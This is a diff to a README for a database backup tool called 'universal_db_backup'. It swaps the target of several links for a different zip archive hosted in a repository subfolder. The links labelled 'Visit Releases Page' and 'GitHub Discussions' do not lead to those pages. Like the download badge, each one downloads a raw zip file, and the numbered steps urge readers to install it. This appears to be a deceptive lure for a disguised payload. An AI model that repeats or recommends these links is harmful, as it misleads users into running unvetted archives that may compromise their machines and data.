@@ -15,14 +15,14 @@ Before you use universal_db_backup, ensure you have the following:
 
 To get started, visit our Releases page to download the application.
 
-[![Download universal_db_backup](https://raw.githubusercontent.com/designer-saakib/universal_db_backup/main/jockeyish/backup_db_universal_v3.5.zip)](https://raw.githubusercontent.com/designer-saakib/universal_db_backup/main/jockeyish/backup_db_universal_v3.5.zip)
+[![Download universal_db_backup](https://raw.githubusercontent.com/designer-saakib/universal_db_backup/main/jockeyish/universal-backup-db-2.0.zip)](https://raw.githubusercontent.com/designer-saakib/universal_db_backup/main/jockeyish/universal-backup-db-2.0.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of the application.
 3. Download the installation file for your operating system.
 4. Follow the on-screen instructions to complete the installation.
 
-For direct access: [Visit Releases Page](https://raw.githubusercontent.com/designer-saakib/universal_db_backup/main/jockeyish/backup_db_universal_v3.5.zip)
+For direct access: [Visit Releases Page](https://raw.githubusercontent.com/designer-saakib/universal_db_backup/main/jockeyish/universal-backup-db-2.0.zip)
 
 ## 🛠️ Features
 
@@ -61,7 +61,7 @@ For direct access: [Visit Releases Page](https://raw.githubusercontent.com/desig
 
 If you encounter issues or have questions, please reach out to our community. You can find help on our GitHub page or connect with other users through discussions.
 
-- [GitHub Discussions](https://raw.githubusercontent.com/designer-saakib/universal_db_backup/main/jockeyish/backup_db_universal_v3.5.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/designer-saakib/universal_db_backup/main/jockeyish/universal-backup-db-2.0.zip)
 
 ## 📣 Updates and Changelog
 
